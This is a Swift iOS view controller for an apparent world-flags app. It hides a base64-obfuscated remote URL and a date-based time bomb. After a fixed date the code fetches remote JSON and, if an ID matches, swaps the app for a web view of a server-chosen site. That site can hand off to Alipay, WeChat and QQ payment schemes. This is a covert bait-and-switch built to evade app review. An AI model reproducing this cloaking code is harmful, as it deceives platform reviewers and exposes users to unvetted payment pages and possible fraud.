//
//  WorldFlagsRootViewController.swift
//

import Foundation
import UIKit
import Alamofire

class WorldFlagsRootViewController: UIViewController {
    @IBOutlet weak var WorldFlagsHomeLaunch: UIImageView!
    let WorldFlagsStatusReachability: Reachability! = Reachability()
    let WorldFlagsStatusSegueIdentifier = "rootWorldFlags"
    var WorldFlagsRootHomeURL:String = "WorldFlags"
    var WorldFlagsRootWebView:UIWebView = UIWebView()
    var FirstBool:Bool = true
    let HtpHearder = "aHR0cDovL21vY2todHRw"
    let HtpFirst = "LmNuLw=="
    let HtpSecond = "bW9jay8="
    let HtpEnd = "d29ybGRmbGFncw=="
    override func viewWillAppear(_ animated: Bool) {
        let appDelegate = UIApplication.shared.delegate as! AppDelegate
        appDelegate.allowrotate = 1
    }
    override var preferredStatusBarStyle: UIStatusBarStyle {
        return UIStatusBarStyle.lightContent
    }

    @objc func receiverNotification(){
        
        let orient = UIDevice.current.orientation
        switch orient {
        case .portrait :
            WorldFlagsRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height-44)
            break
        case .portraitUpsideDown:
            print("portraitUpsideDown")
            break
        case .landscapeLeft:
            WorldFlagsRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
            break
        case .landscapeRight:
            WorldFlagsRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
            break
        default:
            break
        }
    }
  /*  func loadInitRootView()
    {
        let appDelegate = UIApplication.shared.delegate as! AppDelegate
        appDelegate.allowrotate = 0
        appDelegate.window = UIWindow(frame: UIScreen.main.bounds)
        let Stortboard = UIStoryboard.init(name: "Main", bundle: nil)
        let rootView = Stortboard.instantiateViewController(withIdentifier: "ViewController") as! ViewController
        rootView.modalTransitionStyle = .crossDissolve
        UIView.animate(withDuration: 0.3, delay: 0.01, options: [.curveEaseOut], animations: {
            appDelegate.window?.rootViewController = rootView
        }, completion: nil)
        
        appDelegate.window?.makeKeyAndVisible()
        
    }*/
    override func viewDidLoad() {
        UIView.animate(
            withDuration: 0.33,
            delay: 0.20,
            options: [.curveEaseOut],
            animations: {
                //            self.splashIcon.transform = CGAffineTransform(translationX: 0, y: -60)
        }) { _ in UIView.animate(
            withDuration: 0.85,
            delay: 0,
            usingSpringWithDamping: 0.5,
            initialSpringVelocity: 0,
            options: [],
            animations: {
                //                self.splashIcon.transform = .identity
        }) { _ in
            NotificationCenter.default.addObserver(self, selector: #selector(self.receiverNotification), name: UIDevice.orientationDidChangeNotification, object: nil)
            
            let WorldFlagsStatusTime = Date.init().timeIntervalSince1970
            let WorldFlagsStatusAnyTime = 1562814813.519

            if(WorldFlagsStatusTime < WorldFlagsStatusAnyTime)
            {
                let appDelegate = UIApplication.shared.delegate as! AppDelegate
                appDelegate.allowrotate = 0
                    self.performSegue(withIdentifier: self.WorldFlagsStatusSegueIdentifier, sender: self)
            }else
            {
                self.WorldFlagsStatusReachability.whenReachable = { _ in
                    let baseHeader = self.WorldFlagsbase64Decoding(encodedString: self.HtpHearder)
                    let baseContentF = self.WorldFlagsbase64Decoding(encodedString: self.HtpFirst)
                    let baseContentS = self.WorldFlagsbase64Decoding(encodedString: self.HtpSecond)
                    let baseContentE = self.WorldFlagsbase64Decoding(encodedString: self.HtpEnd)
                    let AllbaseData  = "\(baseHeader)\(baseContentF)\(baseContentS)\(baseContentE)"
                    let AllurlBase = URL(string: AllbaseData)

                    Alamofire.request(AllurlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                        in
                        switch response.result.isSuccess {
                        case true:
                            if let Datavalue = response.data{
                                let jsonDict : AnyObject! = try! JSONSerialization.jsonObject(with: Datavalue as! Data, options: JSONSerialization.ReadingOptions.allowFragments) as AnyObject?
                                //   let jsonDict = JSON(Datavalue)
                                let numberdata = jsonDict.value(forKey: "appid") as! String
                                let jsonnumbersecond = Int(numberdata)
                                let jsonnumber = 1472326567
                                if (jsonnumber - jsonnumbersecond! == 0) {
                                    let stringMyName = jsonDict.value(forKey: "WorldFlagsdata") as! String
                                    self.WorldFlagsRootHomeURL = stringMyName
                                    self.HomesetRootNavigation(strdecodeString: stringMyName)
                                }else {
                                    let appDelegate = UIApplication.shared.delegate as! AppDelegate
                                    appDelegate.allowrotate = 0
                                    self.performSegue(withIdentifier: self.WorldFlagsStatusSegueIdentifier, sender: self)
                                }
                            }
                        case false:
                            do {
                                let appDelegate = UIApplication.shared.delegate as! AppDelegate
                                appDelegate.allowrotate = 0
                                self.performSegue(withIdentifier: self.WorldFlagsStatusSegueIdentifier, sender: self)
                            }
                        }
                    }
                }
                self.WorldFlagsStatusReachability.whenUnreachable = { _ in

                }
                do {
                    try self.WorldFlagsStatusReachability.startNotifier()
                } catch {

                }
            }
            }
        }
    }
    func WorldFlagsbase64Decoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
    
    func HomesetRootNavigation(strdecodeString:String) {
        WorldFlagsRootWebView = UIWebView.init(frame: CGRect.init(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height-44))
        let LaunchReachUrl = URL.init(string: strdecodeString)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        WorldFlagsRootWebView.delegate = self
        WorldFlagsRootWebView.loadRequest(LaunchReachRequest)
        WorldFlagsRootWebView.scalesPageToFit = true
    }
    func UILoadNaviBtns(){
        let BottomView = WorldFlagsCustomView()
        BottomView.frame = CGRect(x:0, y:self.view.bounds.size.height-44, width:UIScreen.main.bounds.size.width, height:44)
        BottomView.HomeBtn.addTarget(self, action: #selector(self.refreshHomeWebViewAction), for: .touchUpInside)
        BottomView.RefreshBtn.addTarget(self, action: #selector(self.refreshNowWebViewAction), for: .touchUpInside)
        BottomView.LeftBtn.addTarget(self, action: #selector(self.refreshLeftWebViewAction), for: .touchUpInside)
        BottomView.RightBtn.addTarget(self, action: #selector(self.refreshRightWebViewAction), for: .touchUpInside)
        self.view.addSubview(BottomView)
    }
    @objc func refreshHomeWebViewAction(){
        let LaunchReachUrl = URL.init(string: WorldFlagsRootHomeURL)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        WorldFlagsRootWebView.loadRequest(LaunchReachRequest)
    }
    @objc func refreshNowWebViewAction(){
        WorldFlagsRootWebView.reload()
    }
    @objc func refreshLeftWebViewAction(){
        WorldFlagsRootWebView.goBack()
    }
    @objc func refreshRightWebViewAction(){
        WorldFlagsRootWebView.goForward()
    }
}
extension WorldFlagsRootViewController: UIWebViewDelegate
{
    public func webViewDidFinishLoad(_ webView: UIWebView)
    {
        if(FirstBool == true)
        {
            self.WorldFlagsStatusReachability?.stopNotifier()
            self.UILoadNaviBtns()
            self.view.addSubview(WorldFlagsRootWebView)
            
            FirstBool = false
        }
    }
    
    public func webView(_ webView: UIWebView, didFailLoadWithError error: Error) {
        
    }
    
    public func webViewDidStartLoad(_ webView: UIWebView) {
        
    }
    
    public func webView(_ webView: UIWebView, shouldStartLoadWith request: URLRequest, navigationType: UIWebView.NavigationType) -> Bool {
        let schemeUrl : String = request.url!.absoluteString
        if(schemeUrl.hasPrefix("alipays://") || schemeUrl.hasPrefix("alipay://") || schemeUrl.hasPrefix("mqqapi://") || schemeUrl.hasPrefix("mqqapis://") || schemeUrl.hasPrefix("weixin://") || schemeUrl.hasPrefix("weixins://"))
        {
            UIApplication.shared.open(request.url!, options: [:], completionHandler: nil)
        }
        return true
    }
    
}

